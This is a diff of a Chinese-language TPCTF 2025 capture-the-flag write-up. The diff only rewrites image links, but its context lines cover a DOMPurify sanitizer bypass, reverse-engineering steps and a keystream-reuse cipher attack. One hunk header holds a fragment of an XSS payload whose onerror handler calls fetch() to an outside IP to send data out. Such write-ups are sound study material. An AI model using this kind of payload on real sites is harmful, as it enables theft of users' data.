@@ -48,7 +48,7 @@ aaaaaaaa" onerror="fetch('http://47.237.137.xxx:7777?' +
 
 DOMPurify 在设置了{ ALLOWED_ATTR: [] }时，并不会删除所有的属性。aria-和 data-属性还会存在。
 
-![img](/images/TPCTF2025/img01.png)
+![img](./img01.png)
 
 layout:
 
@@ -66,7 +66,7 @@ layout:
 
 根据[CVE-2023-48219](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce)，相同原理，通过取代字符可以绕过
 
-![img](/images/TPCTF2025/img02.png)
+![img](./img02.png)
 
 Layout:
 
@@ -105,11 +105,11 @@ print(res.text)
 
 ## chase
 
-![img](/images/TPCTF2025/img03.png)
+![img](./img03.png)
 
 第二部分根据导出表可知
 
-![img](/images/TPCTF2025/img04.png)
+![img](./img04.png)
 
 鼠标附上去可以看见映射关系
 
@@ -117,7 +117,7 @@ print(res.text)
 
 查找 PPU Memory 搜索 26 2C 21 27
 
-![img](/images/TPCTF2025/img05.png)
+![img](./img05.png)
 
 再根据对应表翻译出第二部分
 
@@ -271,7 +271,7 @@ for i in range(len(hash_chain)-1):
 
 动态调试定位到基址
 
-![img](/images/TPCTF2025/img06.png)
+![img](./img06.png)
 
 ```python
 import idaapi
@@ -896,7 +896,7 @@ if __name__ == '__main__':
 
 脚本爆破成功结果如下，后续用 data 恢复 flag
 
-![img](/images/TPCTF2025/img07.png)
+![img](./img07.png)
 
 ```python
 with open("data.txt") as f:
@@ -928,7 +928,7 @@ print(len(set(col)))
 
 观察 client.py 发现，如果客户端同时发送消息请求，会存在条件竞争情况，即使用了同一状态的密钥流进行了不同明文的加密，所以导致解密时会出现问题，也呼应了题目描述里的内容。在这一情况下，明文^密钥流=密文，所以在密文中取两块等长的子串异或，即为原明文互相异或，该异或结果应该小于可见字符的最大值，用此作为筛选条件。得到这一异或结果后，已知明文中包含 TPCTF{，即可用刚才异或结果与该明文进行异或，得到其他等长的明文，随后再去扩充这些得到的明文，逐步得到完全的消息。部分恢复明文如下：
 
-![img](/images/TPCTF2025/img08.png)
+![img](./img08.png)
 
 首先得到了 part1 的 flag，直接猜测后续还有 part2，用'the second part of flag'去当作已知明文异或，可同理恢复 flag2 附近的明文，最后得到 flag2。
 
@@ -987,7 +987,7 @@ for s1_idx, s2_idx, sub_xor_idx, xor_output in filtered_results:
 
 这里藏东西了
 
-![img](/images/TPCTF2025/img09.png)
+![img](./img09.png)
 
 发现都是\uDB40\uDDxx，推测只与最后的一个字节有关
 
@@ -1042,7 +1042,7 @@ print(result)
 
 交过的 flag 如图
 
-![img](/images/TPCTF2025/img10.png)
+![img](./img10.png)
 
 s->5 的混淆真的恶心，为尝试此而写的脚本如下
 
@@ -1071,6 +1071,6 @@ for i in ch:
 
 And the scoreboard accepted my guesswork!!!
 
-![img](/images/TPCTF2025/img11.png)
+![img](./img11.png)
 
 L.M.A.O.
